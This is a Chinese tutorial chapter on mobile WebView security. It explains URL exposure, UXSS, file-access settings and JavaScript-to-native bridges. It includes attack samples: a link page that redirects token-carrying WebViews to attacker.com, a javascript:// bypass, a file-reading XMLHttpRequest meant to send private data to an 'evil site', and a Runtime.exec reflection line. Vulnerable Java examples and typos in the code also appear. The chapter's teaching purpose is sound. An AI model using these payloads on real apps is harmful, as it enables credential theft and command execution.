# 第九章
# 移动web安全
在现代移动App开发中，越来越多的开发者采用本地代码加HTML5的混合开发形式。这种做法的优势是App迭代更快，还可以在多个平台复用代码，但操作不当不仅会产生传统的Web安全漏洞，web应用与本地代码的结合还会带来新的威胁
## webview简介
Android和iOS系统都提供了原生的webview用于在App中嵌入Web网页，随着系统不断迭代，其安全性能也在不断提升。
由于WebView本身就是浏览器组件，用来加载和渲染网页，用户也能与其交互，所以常见的前端安全漏洞在WebView中也同样存在。
在App开发中允许webview与本地代码交互，如果使用不当，恶意网页就能调用本地代码，跳出网页，实现更复杂的攻击。
## webview对外暴露
通常情况下App中的WebView只应该加载程序预置的文件或App自身域名的URL，所谓WebView对外暴露是指webview加载的URL可以通过外部输入控制。非常典型的场景是，App没有对URL做校验而是直接通过WebView加载URL，这可能导致敏感信息泄漏的，或当前页面被注入恶意JavaScript代码。
假如某Android应用中有一个ExampleActivity处理类似myapp://example.com/形式的URL，AndroidMainfest.xml文件内容如下：
```
<activity androd:name=".ExampleActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <data android:scheme:"myapp" android:host="example.com"/>
    </intent-filter>
</activity>
```
在ExampleActivity内部获取url参数并通过WebView加载，然后通过程序添加Authorization头向 服务求传递凭证信息，这在App中是非常常见的方式：
```
public class ExampleActivity extends Activity{
    protected void onCreate(Bundle saveInstanceState){
        super.onCreate(saveInstanceState);
        handleIntent(getInten());
    }
    
    private void handleIntent(Intent intent){
        Uri uri= intent.getData();
        String url = uri.getQueryParameter("url");
        webView.loadUrl(url,getAuthHeaders());
    }
    private Map<String, String> getAuthHeaders(){
        Map<String,String> headers = new HashMap<>();
        headers.put("Authorization",getUserToken());
        return headers;
    }
}
```
如果攻击这构造如下的网页让受害者点击：
```
<! DOCUTYPE html>
<html>
    <body style="text-alighn:center;">
        <h1><a href="myapp://example.com/?url=https://attacker.com">Attack</a></h1>
    </body>       
</html>
```
受害者的WebView将携带凭证信息访问攻击者指定的恶意网站https://attacker.com，从而导致凭证泄漏或者访问钓鱼网站，这在二维码扫描场景中尤为注意。
## Universal XSS
所谓通用型XSS(UXSS)漏洞，是指存在浏览器本身或其插件中的XSS漏洞，与具体web应用没有关系。攻击者可以在所有网站上实施UXSS，即使本身网站非常安全。
如果web应用只验证Host，而没有校验协议类型，这个检测还是会被绕过，如：
`javascript://example.com/%0aalert(1)`
WebView本身的一些不安全的设计也产生过很多UXSS漏洞。
## webview跨域访问
在WebView中也存在同源策略，只不过它提供了更多配置选项以放宽限制。需要进行合理配置以保证其安全性。
### setAllowFileAccess
该选项用于设置是否允许WebView加载file://xieyi文件，API3.0之前默认true，之后改为false。恶意App可以将带有恶意脚本的HTML文件写入SD卡，如果其他应用开启了该选项，并且支持通过intent传递URL到WebView中加载，攻击者就可以使WebView加载恶意文件，从而执行攻击者定义的JavaScript代码
### setAllowFileAccessFromFileURLs
用户通过这个选项设置file://协议加载的网页是否可以通过file://协议读取其他文件内容，默认值为false，API3.0以后已经废弃。如果应用会接收外部参数作为WebView的URL，开启这个选项将带来很大的安全风险，如：
```
//获取外部传入的URL
String url = getIntent().getStringExtra("URL");
...
//设置允许执行的JavaScript代码
webSettings.setJavaScriptEnabled(true);
//允许file://协议的文件
webSettings.setAllowFileAccessFromFileURLs(true);
...
webview.loadUrl(url);
```
如果WebView通过file://加载了恶意网页，其中的JavaScript代码可以通过XMLHttpRequest读取应用私有目录的内容，如WebView的Cookie、应用存储了敏感内容的SharedPrefernces：
```
 function read_file(path){
    var req = new XMLHttpRequest();
    req.onreadystatechange = function(){
        if(req.readyState==4){
            var content = req.responseText;
            //send content to evil site
        }
    }
    req.open('GET',path);
    req.send(null);
 }
 read_file('file:///data/data/com.xxx.xxx/shared_prefs/MainActivity.xml');
```
这样就打破了App之间的沙盒隔离，攻击者读取到了App内部的私有数据。
### setAllowUniversalAccessFromFileURLs
用户通过这个选项设置file://协议加载的网页是否可以读取任意源的内容，多了允许访问互联网上的内容。该选项默认为false，并且在API3.0中被废弃
上述跨域访问都依赖WebView通过setJavaScriptEnabled开启JavaScript，如果不需要应用做前端动态交互，可以默认不开启JavaScript
## 与本地代码交互
Android的WebView中，通过addJavaScrptInterface方法可以将一个Java对象注入到Web页面中，然后页面中的JavaScript代码可以直接引用该对象，并调用对象中的方法。利用Java的反射机制可以获得Runtime对象，从而执行系统命令：
```
jsObj.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
```
在API17后，必须在Java代码中对需要暴露给JavaScript的方法加上@JavaScriptInterface注解，才能在JavaScript中调用，如：
```
@JavaSciprtInterface
public void method(String str){
    doSomething(str);
}
```
明确定义了JavaScript中使用方法的白名单，限制了JavaScript的行为，提升了安全性，该机制限制了JavaScript代码与本地代码的交互，很难产生本地代码执行漏洞。但当 存在UXSS或者XSS漏洞时，攻击者可以注入JavaScript代码来访问本地代码暴露的JavaScript对象。
## 其他安全问题
注意调试的setWebContentsDebuggingEnabled选项，使用HTTPS协议，安全证书等

